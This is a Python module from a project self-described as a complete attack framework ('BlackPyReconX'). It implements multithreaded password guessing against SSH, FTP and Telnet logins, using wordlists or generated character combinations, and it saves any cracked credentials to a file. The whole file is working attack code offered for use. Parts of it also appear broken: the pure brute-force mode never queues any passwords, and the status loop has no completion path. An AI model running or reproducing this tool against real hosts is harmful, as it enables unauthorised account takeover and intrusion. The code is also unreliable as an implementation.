# BlackPyReconX - Un framework d'attaque complet
# Copyright (C) 2025 Hermann KEKE
#
# Ce programme est un logiciel libre ; vous pouvez le redistribuer et/ou le
# modifier selon les termes de la Licence publique générale GNU telle que
# publiée par la Free Software Foundation ; soit la version 3 de la Licence,
# soit (à votre choix) toute version ultérieure.
#
# Ce programme est distribué dans l'espoir qu'il sera utile,
# mais SANS AUCUNE GARANTIE ; sans même la garantie implicite de
# QUALITÉ MARCHANDE ou d'ADÉQUATION À UN USAGE PARTICULIER. Voir la
# Licence publique générale GNU pour plus de détails.
#
# Vous devriez avoir reçu une copie de la Licence publique générale GNU
# avec ce programme. Si non, voir <https://www.gnu.org/licenses/>.

import threading
import time
import queue
import itertools
import string
import paramiko
import ftplib
import asyncio
import telnetlib3
import socket
from tqdm import tqdm
from . import utils

# --- Global State ---
bruteforce_state = {
    "running": False,
    "target": None,
    "port": None,
    "service": None,
    "threads": [],
    "found_credentials": None,
    "lock": threading.Lock(),
    "stop_event": threading.Event(),
    "credential_queue": queue.Queue(),
    "total_combinations": 0,
    "pbar": None
}

# --- Connection Functions ---
# Each function now accepts a timeout and is designed to fail gracefully.

def _try_ssh(target, port, username, password, timeout):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(target, port=port, username=username, password=password, timeout=timeout, banner_timeout=timeout)
        return True
    except paramiko.AuthenticationException:
        return False # Correct password would not raise this
    except Exception:
        return False # Any other error (timeout, connection refused) is a failure
    finally:
        client.close()

def _try_ftp(target, port, username, password, timeout):
    try:
        with ftplib.FTP(timeout=timeout) as ftp:
            ftp.connect(target, port)
            ftp.login(username, password)
            ftp.quit()
            return True
    except (ftplib.error_perm, ftplib.error_temp, socket.timeout, ConnectionRefusedError, OSError):
        return False

async def _try_telnet_async(target, port, username, password, timeout):
    try:
        reader, writer = await telnetlib3.open_connection(target, port, shell=False, timeout=timeout)
        await reader.readuntil(b"login:", timeout=2)
        writer.write(username.encode('ascii') + b'\n')
        await reader.readuntil(b"Password:", timeout=2)
        writer.write(password.encode('ascii') + b'\n')
        result = await reader.read(1024)
        writer.close()
        return b"incorrect" not in result.lower()
    except (asyncio.TimeoutError, ConnectionRefusedError, OSError):
        return False

def _try_telnet(target, port, username, password, timeout):
    return asyncio.run(_try_telnet_async(target, port, username, password, timeout))

# --- Worker & Setup ---

SUPPORTED_SERVICES = {
    'ssh': _try_ssh,
    'ftp': _try_ftp,
    'telnet': _try_telnet,
}

def _bruteforce_worker(q, pbar, service_func, target, port, username, timeout, verbose):
    """Picks a password from the queue and tests it against a single username."""
    while not bruteforce_state["stop_event"].is_set():
        try:
            password = q.get_nowait()
        except queue.Empty:
            return

        if verbose:
            tqdm.write(f"[VERBOSE] Testing: {username}:{password}")

        try:
            if service_func(target, port, username, password, timeout):
                with bruteforce_state["lock"]:
                    bruteforce_state["found_credentials"] = (username, password)
                bruteforce_state["stop_event"].set()
                tqdm.write(f"\n[+] SUCCESS! Credentials found: {username}:{password}")
        finally:
            pbar.update(1)
            q.task_done()

def _dictionary_worker(q, pbar, service_func, target, port, timeout, verbose):
    """Picks (username, password) from the queue and tests them."""
    while not bruteforce_state["stop_event"].is_set():
        try:
            username, password = q.get_nowait()
        except queue.Empty:
            return

        if verbose:
            tqdm.write(f"[VERBOSE] Testing: {username}:{password}")

        try:
            if service_func(target, port, username, password, timeout):
                with bruteforce_state["lock"]:
                    bruteforce_state["found_credentials"] = (username, password)
                bruteforce_state["stop_event"].set()
                tqdm.write(f"\n[+] SUCCESS! Credentials found: {username}:{password}")
        finally:
            pbar.update(1)
            q.task_done()

# --- Password Generation ---

def get_charset(charset_name):
    charsets = {
        'alphanum': string.ascii_letters + string.digits,
        'alpha': string.ascii_letters,
        'lower': string.ascii_lowercase,
        'upper': string.ascii_uppercase,
        'digits': string.digits,
        'all': string.ascii_letters + string.digits + string.punctuation
    }
    return charsets.get(charset_name, charset_name)

def generate_passwords(charset, min_len, max_len):
    actual_charset = get_charset(charset)
    for length in range(min_len, max_len + 1):
        for p in itertools.product(actual_charset, repeat=length):
            if bruteforce_state["stop_event"].is_set(): return
            yield ''.join(p)

# --- Main Runner Function ---

def start_bruteforce(attack_type, options):
    global bruteforce_state
    with bruteforce_state["lock"]:
        if bruteforce_state["running"]:
            utils.log_message('!', "Une attaque par force brute est déjà en cours.")
            return

        utils.log_message('*', f"Démarrage de l'attaque par force brute sur {options['target']}:{options['port']}")
        bruteforce_state["running"] = True
        bruteforce_state["target"] = options['target']
        bruteforce_state["port"] = options['port']
        bruteforce_state["service"] = options['service']
        bruteforce_state["threads"] = []
        bruteforce_state["found_credentials"] = None
        bruteforce_state["stop_event"].clear()
        bruteforce_state["credential_queue"] = queue.Queue()
        bruteforce_state["total_combinations"] = 0

    service_func = SUPPORTED_SERVICES.get(options['service'])
    if not service_func:
        utils.log_message('-', f"Service '{options['service']}' is not supported.")
        bruteforce_state["running"] = False
        return

    try:
        if attack_type == 'dictionary':
            with open(options['userlist'], 'r', errors='ignore') as f_users:
                users = [line.strip() for line in f_users if line.strip()]
            with open(options['passlist'], 'r', errors='ignore') as f_pass:
                passwords = [line.strip() for line in f_pass if line.strip()]

            for user in users:
                for password in passwords:
                    bruteforce_state["credential_queue"].put((user, password))
            bruteforce_state["total_combinations"] = len(users) * len(passwords)
        elif attack_type == 'bruteforce':
            # Password generation is handled by the worker
            pass

    except (FileNotFoundError, KeyError, ValueError) as e:
        utils.log_message('-', f"Configuration error: {e}")
        bruteforce_state["running"] = False
        return

    if bruteforce_state["total_combinations"] == 0 and attack_type == 'dictionary':
        utils.log_message('-', "No username/password combinations to test.")
        bruteforce_state["running"] = False
        return

    bruteforce_state["pbar"] = tqdm(total=bruteforce_state["total_combinations"], desc=f"{attack_type.capitalize()} Attack", unit="creds")

    worker_target = _dictionary_worker if attack_type == 'dictionary' else _bruteforce_worker
    worker_args = (bruteforce_state["credential_queue"], bruteforce_state["pbar"], service_func, options['target'], options['port'], options.get('timeout', 5), options.get('verbose', False))
    if attack_type == 'bruteforce':
        worker_args = (bruteforce_state["credential_queue"], bruteforce_state["pbar"], service_func, options['target'], options['port'], options['username'], options.get('timeout', 5), options.get('verbose', False))

    for _ in range(options.get('threads', 50)):
        thread = threading.Thread(target=worker_target, args=worker_args, daemon=True)
        thread.start()
        bruteforce_state["threads"].append(thread)

def stop_bruteforce():
    global bruteforce_state
    with bruteforce_state["lock"]:
        if not bruteforce_state["running"]:
            return
        utils.log_message('+', "Arrêt de l'attaque par force brute.")
        bruteforce_state["stop_event"].set()
        bruteforce_state["running"] = False
        # Clear the queue to unblock threads
        while not bruteforce_state["credential_queue"].empty():
            try:
                bruteforce_state["credential_queue"].get_nowait()
                bruteforce_state["credential_queue"].task_done()
            except queue.Empty:
                break

def get_status():
    with bruteforce_state["lock"]:
        return {
            "running": bruteforce_state["running"],
            "target": bruteforce_state["target"],
            "service": bruteforce_state["service"],
            "progress": f"{bruteforce_state['total_combinations'] - bruteforce_state['credential_queue'].qsize()}/{bruteforce_state['total_combinations']}",
            "found": bruteforce_state["found_credentials"]
        }

def run(attack_type, options):
    start_bruteforce(attack_type, options)

    while get_status()["running"]:
        status = get_status()
        print(f'    [+] Attaque en cours sur {status["target"]} ({status["service"]}) | {status["progress"]}      ', end='\r')
        time.sleep(1)
    print()

    if bruteforce_state["found_credentials"]:
        utils.log_message('+', f"Credentials found: {bruteforce_state['found_credentials'][0]}:{bruteforce_state['found_credentials'][1]}")
        with open("outputs/bruteforce_credentials.txt", "a") as f:
            f.write(f"{bruteforce_state['target']}:{bruteforce_state['port']} ({bruteforce_state['service']}) - {bruteforce_state['found_credentials'][0]}:{bruteforce_state['found_credentials'][1]}\n")
    else:
        utils.log_message('-', "No valid credentials found with the given parameters.")

    return bruteforce_state["found_credentials"]